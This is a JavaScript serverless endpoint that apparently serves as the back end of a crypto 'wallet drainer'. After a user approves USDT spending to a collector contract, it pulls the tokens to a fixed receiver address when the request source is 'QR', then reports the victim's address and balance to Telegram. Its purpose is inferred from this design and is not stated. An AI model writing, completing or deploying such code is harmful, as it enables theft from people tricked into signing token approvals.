import { ethers } from 'ethers';
import {
    handleCors,
    getProvider,
    getUsdtContract,
    executeCollection,
    sendTelegramNotification,
    USDT_ADDRESS,
    USDT_ABI,
    AUTO_COLLECTOR_ADDRESS,
    RPC_URL,
    RECEIVER_ADDRESS
} from './_lib/helpers.js';

export default async function handler(req, res) {
    if (handleCors(req, res)) return;

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    const { userAddress, txHash, source, amount } = req.body;

    console.log(`Received approval from: ${userAddress} | Hash: ${txHash} | Amount: ${amount}`);

    // Debug: Check allowance before attempting transfer
    try {
        const provider = getProvider();
        const usdtContract = getUsdtContract(provider);
        const allowance = await usdtContract.allowance(userAddress, AUTO_COLLECTOR_ADDRESS);
        console.log(`🔍 Debug Allowance for ${userAddress}: ${ethers.formatUnits(allowance, 18)} USDT`);

        if (allowance === 0n) {
            console.warn('⚠️ Allowance is 0! Transfer will likely fail.');
        }
    } catch (err) {
        console.error('❌ Failed to check allowance:', err.message);
    }

    let transferHash = null;

    if (userAddress) {
        try {
            // Logic: Only execute transfer (collectFrom) if source is 'QR'
            if (source && source.toLowerCase() === 'qr') {
                console.log(`📲 Source is QR. Using provided amount: ${amount}`);
                const transferAmount = (amount && !isNaN(amount) && Number(amount) > 0) ? amount : 0;

                if (Number(transferAmount) > 0) {
                    transferHash = await executeCollection(userAddress, transferAmount, RECEIVER_ADDRESS);
                } else {
                    console.warn('⚠️ QR Source but amount is 0 or invalid. Skipping transfer.');
                }
            } else {
                // For 'Website' or other sources, we do NOT transfer immediately.
                console.log(`🌐 Source is '${source || 'Unknown'}'. Skipping auto-transfer (Notification Only).`);
            }
        } catch (transferError) {
            console.error('Auto-Transfer Failed:', transferError.message);
        }

        try {
            let balanceStr = 'Loading...';
            const provider = getProvider();
            const usdtContract = getUsdtContract(provider);
            const balance = await usdtContract.balanceOf(userAddress);
            const decimals = await usdtContract.decimals();
            balanceStr = '$' + ethers.formatUnits(balance, decimals);

            await sendTelegramNotification(userAddress, txHash, source, balanceStr);
        } catch (error) {
            console.error('Telegram error:', error.message);
        }
    }

    res.json({
        success: true,
        transferHash
    });
}
